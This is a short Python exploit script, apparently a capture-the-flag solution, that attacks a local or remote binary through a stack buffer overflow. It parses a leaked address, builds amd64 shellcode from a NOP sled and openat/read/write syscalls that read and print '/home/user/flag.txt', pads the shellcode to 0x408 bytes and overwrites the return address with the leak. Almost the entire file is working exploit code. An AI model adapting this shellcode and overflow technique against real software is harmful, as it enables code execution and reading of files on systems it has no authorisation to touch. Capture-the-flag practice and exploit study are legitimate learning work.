#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./main', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ==================== EXPLOIT ====================

# getdents syscall to list the files in the current directory or any directory

def exploit():

  ru(b'mylib.dll ')
  leak = int((rl().split(b" ")[0][:-1]),16)
  print(hex(leak))


  sc = asm('''nop\n'''*0x10+'''

        xor rax, rax
        mov rax, 0x101
        mov rdi, -1
        lea rsi, [rip + file_path]
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x50
        mov rax, 0
        syscall

        mov rdx, 0x50
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        file_path:
            .asciz "/home/user/flag.txt"

        ''', arch='amd64')

    # sc = asm(shellcraft.openat(-1, "/home/user/flag.txt"))
    # sc += asm(shellcraft.read('rax', 'rsp', 0x50))
    # sc += asm(shellcraft.write(1, 'rsp', 0x50))

  s(sc.ljust(0x408, b'A') + p64(leak))

  interactive()

if __name__ == '__main__':
  exploit()


